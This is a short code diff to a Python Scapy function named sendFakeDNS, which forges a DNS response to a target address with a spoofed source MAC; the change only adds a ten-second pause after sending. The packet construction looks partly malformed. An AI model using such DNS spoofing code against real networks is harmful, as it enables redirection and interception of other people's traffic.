@@ -22,6 +22,7 @@ def sendFakeDNS(pkt):
     if pkt[IP].src == targetip: 
         dnsResPacket = Ether(dst=getmacbyip(targetip),src=getmacbyip("10.3.2.12"))/IP(dst=targetip)/UDP(dport=53)/DNS(rd=1, qr=1, qd=DNSRR(rrname="61.13.148.37"))
         sendp(dnsResPacket)
+        time.sleep(10)
     else:
         StopDNS()
     
